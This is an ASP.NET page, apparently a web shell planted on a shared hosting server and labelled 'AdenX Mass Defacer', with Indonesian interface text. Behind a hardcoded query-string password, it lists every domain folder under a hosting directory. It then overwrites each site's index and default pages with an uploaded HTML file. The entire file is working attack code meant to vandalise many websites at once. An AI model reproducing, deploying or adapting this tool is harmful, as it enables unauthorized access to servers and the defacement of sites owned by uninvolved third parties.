<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Collections.Generic" %>

<script runat="server">
    
    protected void Page_Load(object sender, EventArgs e)
    {
        string pass = Request.QueryString["pass"];
        string action = Request.QueryString["action"];
        
        if (pass != "AdenX2025")
        {
            ShowForm();
            return;
        }
        
        if (action == "deface" && Request.Files.Count > 0)
        {
            MassDeface();
        }
        else if (action == "list")
        {
            ListDomains();
        }
        else
        {
            ShowForm();
        }
    }
    
    private void ShowForm()
    {
        Response.Write("<!DOCTYPE html>");
        Response.Write("<html>");
        Response.Write("<head>");
        Response.Write("<title>AdenX Mass Defacer</title>");
        Response.Write("<style>");
        Response.Write("body{background:#000;color:#0f0;font-family:monospace;padding:20px;}");
        Response.Write(".container{max-width:600px;margin:0 auto;border:1px solid #0f0;padding:20px;}");
        Response.Write("input,select{width:100%;margin:10px 0;background:#111;color:#0f0;border:1px solid #0f0;padding:8px;}");
        Response.Write("input[type=submit]{background:#0f0;color:#000;font-weight:bold;cursor:pointer;}");
        Response.Write(".title{color:#f0f;font-size:24px;text-align:center;margin-bottom:20px;}");
        Response.Write("</style>");
        Response.Write("</head>");
        Response.Write("<body>");
        Response.Write("<div class='container'>");
        Response.Write("<div class='title'>MASS DEFACER TOOL</div>");
        
        int domainCount = 0;
        try
        {
            domainCount = Directory.GetDirectories(@"E:\New_Files\").Length;
        }
        catch { }
        
        Response.Write("<div>Target: E:\\New_Files\\ (" + domainCount + " domain)</div>");
        Response.Write("<br>");
        
        Response.Write("<form method='post' enctype='multipart/form-data'>");
        Response.Write("<input type='hidden' name='action' value='deface'>");
        Response.Write("<input type='hidden' name='pass' value='AdenX2025'>");
        
        Response.Write("<label>File HTML Deface:</label>");
        Response.Write("<input type='file' name='defaceFile' accept='.html,.htm' required>");
        
        Response.Write("<label>Nama Target (kosongkan biar otomatis):</label>");
        Response.Write("<input type='text' name='targetName' placeholder='index.html'>");
        
        Response.Write("<label>Opsi:</label>");
        Response.Write("<select name='option'>");
        Response.Write("<option value='all'>Semua file index</option>");
        Response.Write("<option value='index'>Hanya index.html</option>");
        Response.Write("<option value='default'>Hanya default.aspx</option>");
        Response.Write("<option value='backup'>Backup + ganti semua</option>");
        Response.Write("</select>");
        
        Response.Write("<input type='submit' value='MASS DEFACE NOW'>");
        Response.Write("</form>");
        
        Response.Write("<br><a href='?action=list&pass=AdenX2025' style='color:#0ff;'>Lihat Daftar Domain</a>");
        Response.Write("</div>");
        Response.Write("</body>");
        Response.Write("</html>");
    }
    
    private void ListDomains()
    {
        Response.Write("<pre style='background:#000;color:#0f0;padding:20px;'>");
        
        try
        {
            string path = @"E:\New_Files\";
            if (Directory.Exists(path))
            {
                string[] dirs = Directory.GetDirectories(path);
                Response.Write("Total domain: " + dirs.Length + "\n");
                Response.Write("========================\n");
                
                for (int i = 0; i < dirs.Length; i++)
                {
                    string name = Path.GetFileName(dirs[i]);
                    Response.Write((i + 1) + ". " + name + "\n");
                }
            }
            else
            {
                Response.Write("Folder tidak ditemukan!");
            }
        }
        catch (Exception ex)
        {
            Response.Write("Error: " + ex.Message);
        }
        
        Response.Write("\n\n<a href='?pass=AdenX2025'>Kembali</a>");
        Response.Write("</pre>");
    }
    
    private void MassDeface()
    {
        Response.ContentType = "text/html";
        Response.Write("<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'>");
        Response.Write("<h2>PROSES MASS DEFACE</h2>");
        Response.Write("<pre>");
        
        try
        {
            HttpPostedFile file = Request.Files[0];
            string targetName = Request.Form["targetName"];
            string option = Request.Form["option"];
            
            if (file == null || file.ContentLength == 0)
            {
                Response.Write("ERROR: File kosong!\n");
                goto End;
            }
            
            byte[] fileData = new byte[file.ContentLength];
            file.InputStream.Read(fileData, 0, file.ContentLength);
            
            if (string.IsNullOrEmpty(targetName))
            {
                targetName = Path.GetFileName(file.FileName);
                if (string.IsNullOrEmpty(targetName)) targetName = "index.html";
            }
            
            string basePath = @"E:\New_Files\";
            if (!Directory.Exists(basePath))
            {
                Response.Write("ERROR: Folder tidak ditemukan!\n");
                goto End;
            }
            
            string[] domains = Directory.GetDirectories(basePath);
            Response.Write("Target: " + domains.Length + " domain\n");
            Response.Write("File: " + targetName + "\n");
            Response.Write("Opsi: " + option + "\n");
            Response.Write("========================\n\n");
            
            int success = 0;
            int failed = 0;
            
            foreach (string domain in domains)
            {
                string domainName = Path.GetFileName(domain);
                Response.Write(domainName + " ... ");
                
                try
                {
                    string[] targets = GetTargetFiles(domain, targetName, option);
                    bool hasSuccess = false;
                    
                    foreach (string target in targets)
                    {
                        try
                        {
                            if (option == "backup" && File.Exists(target))
                            {
                                string backup = target + ".backup";
                                File.Copy(target, backup, true);
                            }
                            
                            File.WriteAllBytes(target, fileData);
                            hasSuccess = true;
                            Response.Write("[" + Path.GetFileName(target) + "] ");
                        }
                        catch { }
                    }
                    
                    if (hasSuccess)
                    {
                        Response.Write(" OK\n");
                        success++;
                    }
                    else
                    {
                        Response.Write(" GAGAL (tidak bisa menulis)\n");
                        failed++;
                    }
                }
                catch (Exception ex)
                {
                    Response.Write(" GAGAL (" + ex.Message.Substring(0, 20) + "...)\n");
                    failed++;
                }
            }
            
            Response.Write("\n========================\n");
            Response.Write("BERHASIL: " + success + " domain\n");
            Response.Write("GAGAL: " + failed + " domain\n");
        }
        catch (Exception ex)
        {
            Response.Write("FATAL ERROR: " + ex.Message + "\n");
        }
        
        End:
        Response.Write("</pre>");
        Response.Write("<br><a href='?pass=AdenX2025'>Kembali ke menu</a>");
        Response.Write("</body></html>");
    }
    
    private string[] GetTargetFiles(string domainPath, string defaultName, string option)
    {
        List<string> files = new List<string>();
        
        if (option == "index" || option == "all" || option == "backup")
        {
            files.Add(Path.Combine(domainPath, "index.html"));
            files.Add(Path.Combine(domainPath, "index.htm"));
        }
        
        if (option == "default" || option == "all" || option == "backup")
        {
            files.Add(Path.Combine(domainPath, "default.aspx"));
            files.Add(Path.Combine(domainPath, "Default.aspx"));
            files.Add(Path.Combine(domainPath, "default.asp"));
        }
        
        if (option == "all" || option == "backup")
        {
            files.Add(Path.Combine(domainPath, "index.php"));
            files.Add(Path.Combine(domainPath, "home.html"));
            files.Add(Path.Combine(domainPath, "main.aspx"));
        }
        
        // Tambah nama custom kalo ada
        if (!string.IsNullOrEmpty(defaultName) && defaultName != "index.html")
        {
            files.Add(Path.Combine(domainPath, defaultName));
        }
        
        // Hapus duplikat
        List<string> unique = new List<string>();
        foreach (string f in files)
        {
            if (!unique.Contains(f)) unique.Add(f);
        }
        
        return unique.ToArray();
    }
    
</script>